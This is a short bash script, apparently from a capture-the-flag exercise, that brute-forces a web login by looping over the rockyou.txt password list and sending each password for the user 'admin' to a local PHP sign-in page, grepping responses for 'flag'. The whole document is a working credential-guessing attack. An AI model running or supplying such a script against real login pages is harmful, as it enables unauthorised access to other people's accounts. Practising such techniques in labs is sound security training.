file="rockyou.txt"

while read -r line
do
	echo "Trying $line"
	curl -X GET "http://127.0.0.1:4443/index.php?page=signin&username=admin&password=${line}&Login=Login#" | grep 'flag'
done < "$file"